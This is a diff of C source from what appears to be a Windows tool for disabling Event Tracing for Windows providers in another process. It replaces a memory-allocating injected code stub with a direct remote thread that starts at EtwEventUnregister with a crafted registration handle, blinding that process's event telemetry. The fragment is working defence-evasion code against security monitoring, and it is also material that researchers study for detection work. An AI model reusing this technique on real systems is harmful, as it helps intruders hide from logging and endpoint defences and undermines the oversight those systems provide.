@@ -518,7 +518,7 @@ typedef struct _disable_ctx {
     ULONG             Result;
 } disable_ctx;
   
-// disable ETW provider
+// disable ETW provider using code stub
 DWORD WINAPI DisableStub(LPVOID lpParameter) {
     disable_ctx *ctx;
     
@@ -539,62 +539,36 @@ BOOL etw_disable(
     HMODULE               m;
     HANDLE                ht;
     RtlCreateUserThread_t pRtlCreateUserThread;
-    disable_ctx           c;
-    LPVOID                cs, ds;
-    PBYTE                 code, data;
-    SIZE_T                wr, rd;
-    DWORD                 cslen, dslen;
     CLIENT_ID             cid;
     NTSTATUS              nt=~0UL;
-    DWORD                 t;
+    REGHANDLE             RegHandle;
+    EventUnregister_t     pEtwEventUnregister;
+    ULONG                 Result;
     
+    // resolve address of API for creating new thread
     m = GetModuleHandle(L"ntdll.dll");
     pRtlCreateUserThread = (RtlCreateUserThread_t)
         GetProcAddress(m, "RtlCreateUserThread");
-       
-    c.RegHandle       = (REGHANDLE)((ULONG64)node | (ULONG64)index << 48);
-    c.EventUnregister = (EventUnregister_t)GetProcAddress(m, "EtwEventUnregister");
     
-    dslen = sizeof(disable_ctx);
-    data  = (PBYTE)&c;
-    
-    wprintf(L"  [ Allocating %i bytes of memory for data.\n", dslen);
-    
-    ds = VirtualAllocEx(hp, NULL, dslen,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    WriteProcessMemory(hp, ds, data, dslen, &wr);
-      
-    cslen = (PBYTE)&DisableStubEnd - (PBYTE)&DisableStub;
-    code  = (PBYTE)&DisableStub;
-    
-    wprintf(L"  [ Allocating %i bytes of memory for code.\n", cslen);
-    
-    cs = VirtualAllocEx(hp, NULL, cslen, 
-      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hp, cs, code, cslen, &wr); 
-    
-    wprintf(L"  [ Code : %p data : %p.\n", cs, ds);
+    // create registration handle    
+    RegHandle           = (REGHANDLE)((ULONG64)node | (ULONG64)index << 48);
+    pEtwEventUnregister = (EventUnregister_t)GetProcAddress(m, "EtwEventUnregister");
 
     // execute payload in remote process
-    printf("  [ Creating new thread.\n");
+    printf("  [ Executing EventUnregister in remote process.\n");
     nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
-      NULL, cs, ds, &ht, &cid);
+      NULL, pEtwEventUnregister, (PVOID)RegHandle, &ht, &cid);
 
-    printf("  [ nt status is %lx\n", nt);
+    printf("  [ NTSTATUS is %lx\n", nt);
     WaitForSingleObject(ht, INFINITE);
     
-    ReadProcessMemory(hp, ds, data, dslen, &rd);
-    // close remote thread handle
+    // read result of EtwEventUnregister
+    GetExitCodeThread(ht, &Result);
     CloseHandle(ht);
     
-    // free remote memory
-    printf("  [ Releasing memory.\n\n");
-    VirtualFreeEx(hp, cs, 0, MEM_RELEASE | MEM_DECOMMIT);
-    VirtualFreeEx(hp, ds, 0, MEM_RELEASE | MEM_DECOMMIT);
+    SetLastError(Result);
     
-    SetLastError(c.Result);
-    
-    if(c.Result != ERROR_SUCCESS) {
+    if(Result != ERROR_SUCCESS) {
       xstrerror(L"etw_disable");
       return FALSE;
     }
